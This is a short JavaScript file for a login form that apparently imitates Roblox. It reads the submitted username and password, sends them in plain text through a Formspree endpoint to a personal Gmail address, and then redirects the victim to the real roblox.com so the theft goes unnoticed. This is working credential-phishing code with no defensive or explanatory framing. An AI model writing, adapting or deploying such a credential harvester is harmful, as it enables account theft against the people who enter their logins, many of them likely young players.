document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    // Get login details
    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    // Construct email body
    let emailBody = `Username: ${username}\nPassword: ${password}`;

    // Send email using a mail service (Use EmailJS, SMTP, or a backend)
    fetch('https://formspree.io/f/mayourcustomendpoint', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: "garrettwins3@gmail.com",
            subject: "New Login Attempt",
            message: emailBody
        })
    }).then(response => {
        if (response.ok) {
            alert("Login request sent!");
            window.location.href = "https://www.roblox.com/"; // Redirect to Roblox
        } else {
            alert("Error sending email.");
        }
    }).catch(error => {
        console.error('Error:', error);
        alert("Error sending request.");
    });
});

// Pop-up function
function showPopup() {
    document.getElementById('popup').style.display = "block";
}

function closePopup() {
    document.getElementById('popup').style.display = "none";
}
